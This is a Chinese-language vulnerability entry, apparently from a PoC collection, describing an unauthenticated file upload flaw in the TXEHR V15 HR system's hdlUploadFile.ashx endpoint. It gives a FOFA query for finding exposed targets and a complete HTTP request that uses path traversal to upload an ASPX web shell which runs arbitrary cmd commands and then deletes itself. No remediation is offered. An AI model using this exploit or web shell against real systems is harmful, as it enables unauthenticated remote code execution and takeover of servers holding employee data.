# 同享人力资源管理系统hdlUploadFile.ashx存在文件上传漏洞

同享人力资源管理系统-TXEHR V15 hdlUploadFile.ashx 接口处存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```javascript
body="/Assistant/Default.aspx"
```

## poc

```javascript
POST /MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/rce HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2558.72 Safari/537.36
Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
Connection: close
 
-----------------------------142851345723692939351758052805
Content-Disposition: form-data; name="Filedata"; filename="rce.aspx"
Content-Type: text/plain
 
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();%>
-----------------------------142851345723692939351758052805--
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408072336134.png)

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408072337493.png)